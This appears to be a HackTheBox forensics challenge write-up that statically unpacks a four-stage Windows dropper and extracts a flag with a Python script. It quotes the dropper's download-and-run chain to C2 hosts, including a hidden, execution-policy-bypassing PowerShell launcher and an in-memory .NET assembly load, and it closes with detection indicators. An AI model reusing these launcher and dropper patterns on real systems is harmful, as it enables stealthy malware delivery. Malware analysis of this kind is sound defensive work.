---
title: "Getting Closer"
date: 2027-10-14 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, malware, vbscript, powershell, deobfuscation, dropper, dotnet]
description: "An Easy forensics challenge that walks a multi-stage Windows dropper: a polyglot JS downloader, a junk-obfuscated VBScript that rebuilds a hidden PowerShell launcher, and a base64 .NET assembly smuggled between ASCII markers inside a C2-served PNG. The flag is a hard-coded string in the final assembly — recovered by statically emulating each layer instead of detonating it."
---

## Overview

`Getting Closer` is an Easy HackTheBox **Forensics** challenge. You're handed two artifacts — `vaccine.js` and a 718 KB `stage2.vbs` — plus a Docker container that role-plays the malware's command-and-control hosts (`infected.human.htb`, `infected.zombie.htb`). The sample is a four-stage Windows dropper, and every stage assumes an analyst will detonate it in a sandbox. We do the opposite: we statically peel each layer in Python, follow the chain to a [.NET assembly embedded in an image](https://cwe.mitre.org/data/definitions/506.html), and read the flag straight out of its strings.

## The technique

The whole challenge is *layered obfuscation*, and the winning move at each step is to model the transformation rather than execute it:

1. **`vaccine.js`** — a polyglot JavaScript dropper. The runnable part uses `MSXML2.XMLHTTP` to `GET http://infected.human.htb/d/BKtQR`, writes the response to `%TEMP%\<random>.vbs`, and launches it with `wscript`. So the C2 path `/d/BKtQR` *is* `stage2.vbs`.

2. **`stage2.vbs`** — 930 lines that look like noise: hundreds of `label:label` decoy lines wrapped around two real string accumulators.
   - A PowerShell launcher is assembled by repeated `ACC = ACC & StrReverse("...")` (every literal is stored reversed) and cleaned up with `Replace(ACC, "<junk>", "<char>")`. Rebuilt, it reads:
     `powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD`
     where `$OWjuxD = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Codigo.replace('em9tYmllc','A')))`.
   - `$Codigo` is one giant base64 line with two tricks: the marker token `em9tYmllc` is sprinkled throughout (later `.replace('em9tYmllc','A')`'d out), and between quoted base64 segments a helper concatenation (`Cp & kt & Cp`) is collapsed to the single base64 character `P` by a `Replace(...,"P")`. So `$Codigo` is the quoted segments **joined by `"P"`**, marker stripped, decoded as **UTF-16LE**.

3. **Inner PowerShell** — downloads `…/WJveX71agmOQ6Gw_1698762642.jpg` (the file is actually a PNG), finds the literal ASCII markers `<<BASE64_START>>` and `<<BASE64_END>>` in the raw bytes, base64-decodes what's between them into a **.NET assembly (MZ/PE)**, `Assembly::Load`s it, and invokes `Fiber.Home.VAI(...)`. The first argument decodes-and-reverses to a Firebase Storage `transfer.txt` URL — the stage-4 dead-drop (now returns HTTP 402, so it's irrelevant to the flag). The "image" carries no real steganography; it's just a base64 PE between two markers.

4. **The flag** is a hard-coded string inside that stage-3 .NET assembly.

## Solution

The whole chain is reproducible against a freshly spawned container. Create `solve.py`:

```python
import sys, re, base64, urllib.request

def fetch(url, host):
    req = urllib.request.Request(url, headers={"Host": host})
    return urllib.request.urlopen(req, timeout=20).read()

ip, port = sys.argv[1], sys.argv[2]
base = f"http://{ip}:{port}"

# stage 2: rebuild $Codigo -> inner PowerShell
vbs = fetch(f"{base}/d/BKtQR", "infected.human.htb").decode("latin-1")
line = [l for l in vbs.splitlines() if "em9tYmllc" in l and l.count('"') > 4][0]
codigo = "P".join(re.findall(r'"([^"]*)"', line)).replace("em9tYmllc", "A")
inner_ps = base64.b64decode(codigo).decode("utf-16-le", "replace")

# stage 3: pull the image URL, carve the .NET assembly out of the PNG
img = re.search(r"\$imageUrl = '([^']+)'", inner_ps).group(1).split("/", 3)[-1]
png = fetch(f"{base}/{img}", "infected.zombie.htb")
s = png.find(b"<<BASE64_START>>"); e = png.find(b"<<BASE64_END>>")
asm = base64.b64decode(png[s + len(b"<<BASE64_START>>"):e])

# flag: a hard-coded string inside the assembly
print(re.search(rb"HTB\{[^}]+\}", asm).group().decode())
```

Run it against the live C2 container:

```bash
python3 solve.py <docker-ip> <docker-port>
# HTB{...}
```

One infrastructure note: the container is a small Flask/Werkzeug server that serves the stages when you send the right `Host` header (`infected.human.htb` / `infected.zombie.htb`). The first spawned instance can come up with no IP and time out — restart it and re-query the challenge info until you get a routable `ip:port`.

## Why it worked

The author stacked four cheap obfuscation layers — reversed literals, marker-substitution base64, UTF-16LE encoding, and a PE disguised as an image — each effective only against `strings`/grep and against analysts who'd rather run the sample than read it. None of it is real cryptography or real steganography: every layer is a deterministic, invertible transformation. Emulating those transformations in a few lines of Python collapses the entire chain, and the final stage stores its [embedded payload](https://cwe.mitre.org/data/definitions/506.html) — and the flag — in cleartext.

## Fix / defense

This is malware, so the "fix" is detection rather than a code patch:

- Alert on script hosts (`wscript.exe` / `cscript.exe`) spawning `powershell.exe`, especially with `-windowstyle hidden`, `-ep bypass`, or `FromBase64String` on the command line — a classic parent/child red flag.
- Enable AMSI and PowerShell ScriptBlock logging (Event ID 4104) so the decoded launcher is captured even when the on-disk VBScript stays obfuscated.
- Egress-filter to unknown hosts; the chain dies without reaching the C2 and Firebase. Inspect downloaded "images" whose size or embedded markers (`<<BASE64_START>>`, an `MZ` header) don't match their declared type.
